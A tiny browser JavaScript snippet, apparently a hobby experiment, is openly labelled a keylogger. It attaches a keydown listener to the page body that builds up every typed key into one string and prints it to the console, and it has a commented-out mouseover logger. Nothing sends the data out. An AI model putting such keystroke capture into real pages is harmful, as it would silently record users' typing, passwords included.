console.log("GOGO KEYLOGGER BIT FGUCK");

let hoverLogger = document.body; 
let keyLogger = document.body;
let combinedKey = ``;

//Hover-logger
/* hoverLogger.addEventListener("mouseover", (event) => {
    console.log(`Name: ${event.target.nodeName}, HTML: ${event.target.innerHTML}`); }
); */

//Key-logger
keyLogger.addEventListener("keydown", (event) => {
    combinedKey += event.key;
    console.log(`Key:  ${combinedKey}`);
    }
);
